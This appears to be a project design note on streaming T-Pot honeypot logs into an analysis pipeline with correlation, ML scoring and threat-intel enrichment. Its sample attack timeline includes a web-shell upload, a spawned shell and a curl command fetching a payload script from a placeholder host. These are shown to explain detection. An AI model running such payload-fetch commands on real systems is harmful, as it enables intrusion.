# Real-Time Honeypot Ingest Plan

Last updated: 2026-06-14

## Current Batch Pull Status

The current pull-based T-Pot sync command is:

```bash
scripts/sync-tpot-logs.sh --env .env
```

Latest result: successful on 2026-06-14 after populating `.env` with the remote
T-Pot host, SSH user, SSH key, nonstandard SSH port, and remote data path.

```bash
Synced T-Pot log files into data/logs_only
```

The latest local batch is approximately 496 MiB across 843 files. To refresh it
again, use:

```bash
scripts/ml-edr-loop.sh --sync
```

That will sync T-Pot log-like files, rebuild endpoint-window datasets, tune the
model objectives, and write loop outputs.

## Recommendation

Move from research-server pull jobs to honeypot push streaming.

The honeypot should never need inbound SSH from the analysis server, and the
analysis server should not hold a reusable SSH key that can administer the
honeypot. Treat the honeypot as hostile input and the research server as
rebuildable analysis infrastructure.

Recommended shape:

```text
T-Pot host
  log tailer/forwarder
  write-only sensor credential
  outbound TLS only
        |
        v
Research ingest endpoint
  narrow HTTPS/syslog/OTLP collector
  append-only raw spool
  schema validation
  parser sandbox
  DuckDB/SIEM store
  ML scorer
  dashboard + analyst queue
```

Use an off-the-shelf forwarder on the honeypot when possible:

- Vector
- Fluent Bit
- Filebeat
- rsyslog with TLS

The forwarder tails T-Pot JSON/log files and pushes events to the research
collector over TLS. The collector writes raw records first, then downstream
workers parse and enrich them.

## Security Controls

Minimum controls:

- One-way data path: honeypot initiates outbound connection to collector.
- No inbound SSH from the research server to the honeypot for routine ingest.
- Per-sensor write-only API token or mTLS client certificate.
- Firewall honeypot egress to the collector endpoint and only other required
  update/management destinations.
- No SIEM, MISP, or dashboard secrets on the honeypot.
- Collector runs in a low-privilege container or VM.
- Collector appends raw data and does not execute content from logs.
- Parser runs with file-size, line-size, decompression, and rate limits.
- Raw logs are retained separately from parsed data.
- Research server backups are tested by restoring into a clean instance.

If the research server is compromised, the attacker should not gain a path back
to administer the honeypot. At worst, they should be able to read or poison
analysis data until the sensor credential is rotated.

## Data Flow

1. Honeypot forwarder tails logs.
2. Collector receives newline-delimited events.
3. Raw event is written to `logs/ingest/<sensor>/<date>.ndjson` or equivalent.
4. Normalizer extracts common fields:
   - timestamp
   - sensor
   - source
   - source IP / destination IP / ports / protocol
   - username or session ID if present
   - URL/domain/hash/command if present
   - original raw event pointer
5. Correlator extracts entities and creates links.
6. Window builder creates ML endpoint windows.
7. MISP enriches entities when there is an IOC match.
8. ML scorer adds anomaly/risk score.
9. SIEM/dashboard receives enriched alert candidates.
10. LLM summarizes only after rules/ML/MISP produce evidence.

## Correlation Without MISP

MISP is not required to create windows or episodes. MISP only adds external
threat-intel context.

Without a MISP hit, correlate local logs by available identifiers:

| Level | Strong Keys | Fallback Keys |
| --- | --- | --- |
| Request | request ID, trace ID | source IP + URL + timestamp |
| Session | session ID, cookie, JWT subject | source IP + user agent + time gap |
| User | username, account ID | source IP + login pattern |
| Host | hostname, endpoint IP, container ID | destination IP |
| Network flow | 5-tuple and flow ID | source/destination pair + time |
| Process | PID, parent PID, command line | executable + host + time |

An example episode can be assembled from local evidence alone:

```text
12:00:01 nginx: POST /upload.php from 203.0.113.10
12:00:02 app: wrote /tmp/a.php
12:00:03 auditd: www-data spawned /bin/sh
12:00:04 shell: curl http://example/payload.sh
12:00:05 Zeek: outbound connection from web-01
12:00:06 Suricata: suspicious outbound alert
```

Even without IOC reputation, that chain is worth investigation.

## Windows And Episodes

Use both:

- **Window**: fixed time bucket for ML scoring.
- **Episode**: linked event chain for analyst explanation.

Window key:

```text
sensor + endpoint + role + time_bucket
```

Example:

```text
sensor=tpot-01
endpoint=<protected-endpoint-ip>
role=inbound
bucket=2026-06-14T12:00:00Z..2026-06-14T12:01:00Z
```

Episode key:

```text
sensor + primary entity + related entities + time span
```

Examples:

```text
source_ip=203.0.113.10 + session=abc + web-01 + 5 minute span
user=alice + host=web-01 + login/process/network chain
```

The ML model scores windows. The LLM should summarize episodes because episodes
preserve the story and raw evidence.

## Training Impact

The current local data is enough to keep training and tuning, but new data is
important because:

- real traffic drifts over time;
- weak labels improve when more sensors and events are observed;
- threshold calibration needs recent benign traffic;
- customer deployments will have different baselines;
- MISP matches can retro-label older windows after new IOCs arrive.

Use new batches for temporal evaluation, not random train/test splits. The
question is whether a model trained on earlier traffic still works on later
traffic.

## Viability For Product

This is viable as an affordable security product if positioned as:

```text
SIEM enrichment + correlation + ML prioritization + analyst explanation
```

It should not be positioned as a full EDR replacement. The strongest product
value is helping small teams answer:

```text
Which events are worth looking at first, and why?
```

Different customers can be handled with profiles:

- web server profile
- Linux SSH/server profile
- honeypot profile
- cloud workload profile
- Microsoft 365 identity profile
- network IDS profile

Each profile defines its available log sources, correlation keys, feature set,
MISP enrichment policy, and alert thresholds.
